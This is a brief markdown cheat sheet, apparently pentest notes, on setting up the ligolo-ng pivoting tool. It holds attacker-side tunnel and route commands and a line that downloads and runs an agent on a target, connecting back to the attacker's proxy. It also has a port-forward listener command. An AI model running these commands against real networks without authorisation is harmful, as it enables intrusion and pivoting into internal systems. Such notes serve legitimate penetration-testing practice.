# Ligolo Proxy setup and generals Commands

https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/
<img width="897" height="391" alt="image" src="https://github.com/user-attachments/assets/ff261fe4-d9a4-4cf0-91c8-2d7d19f4d61d" />

### Get ligolo 

https://github.com/nicocha30/ligolo-ng
Install the ‘agent’ file on the target machine and the ‘proxy’ file on the attacking machine (Kali Linux).

### setup ligolo
ROOT on attacker machine:
```
ip tuntap add user root mode tun ligolo
ip link set ligolo up
ifconfig
```
<img width="725" height="104" alt="image" src="https://github.com/user-attachments/assets/47f55501-344b-4643-9742-5956cb70a79b" />


start proxy : 

```
./proxy -selfcert
```

```
 wget 192.168.1.5/agent.exe -o agent.exe
./agent.exe -connect 10.10.10.10:11601 -ignore-cert
```

```
ip route add 10.10.10.0/24 dev ligolo
ip route list
```

<img width="1134" height="267" alt="image" src="https://github.com/user-attachments/assets/b7e7b7ec-e82c-4245-9b47-b1af5696bf67" />

<img width="1413" height="93" alt="image" src="https://github.com/user-attachments/assets/30a2d250-14ad-4ea1-a66c-400dfaf4c996" />

now link is seen as up. let's nmap everythings !

### Others commands


add a listener on (pivot machine:port -- to localhost machine:port)
```
listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:1337
```


